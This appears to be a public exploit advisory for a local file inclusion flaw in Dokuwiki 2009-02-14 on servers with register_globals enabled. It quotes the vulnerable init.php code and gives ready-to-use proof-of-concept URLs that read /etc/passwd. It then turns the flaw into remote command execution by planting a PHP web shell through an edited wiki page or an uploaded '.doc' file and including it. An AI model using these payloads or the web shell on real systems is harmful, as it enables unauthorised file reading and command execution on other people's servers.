Dokuwiki 2009-02-14 Local File Inclusion Vulnerability
======================================================


# Author_		girex

# CMS_			Dokuwiki
# Homepage_		dokuwiki.org

# Affected versions_	2009-02-14
			rc2009-02-06
			rc2009-01-30

# Bug_			Local file inclusion
# Need_			register_globals = On


# Vuln description_
# File:	/inc/init.php


  ...

  global $config_cascade;
  if (empty($config_cascade)) {
    $config_cascade = array(
      &#039;main&#039; => array(
        &#039;default&#039;   => array(DOKU_CONF.&#039;dokuwiki.php&#039;),
        &#039;local&#039;     => array(DOKU_CONF.&#039;local.php&#039;),
        &#039;protected&#039; => array(DOKU_CONF.&#039;local.protected.php&#039;),
      ),
  
  ...

  // load the global config file(s)
  foreach (array(&#039;default&#039;,&#039;local&#039;,&#039;protected&#039;) as $config_group) {
    if (empty($config_cascade[&#039;main&#039;][$config_group])) continue;
    foreach ($config_cascade[&#039;main&#039;][$config_group] as $config_file) {
      if (@file_exists($config_file)) {
        include($config_file);
      }
    }
  }


# So we can set $config_cascade arrays via register globals
# It&#039;s not a RFI couse use of file_exists function.

# First of all you can check the dokuwiki&#039;s version here:
# /[host]/[path]/VERSION
# and check if it&#039;s a vulnerable version

# PoC: [host]/[path]/doku.php?config_cascade[main][default][]=/etc/passwd
# PoC: [host]/[path]/doku.php?config_cascade[main][default][]=./README

# Note:
# You can obtain a remote command execution if you can edit the content of a page
# Just insert your php code into it like: <?php system($_GET[cmd]); ?>
# And include it:

# PoC: [host]/[path]/doku.php?config_cascade[main][default][]=./data/pages/[page_edited].txt

# Or you can check if you have permissions to upload file via:
# [host]/[path]/lib/exe/mediamanager.php

# If so, upload your file with .doc extension then include it:

# PoC: [host]/[path]/doku.php?config_cascade[main][default][]=./data/media/[uploaded_file].doc




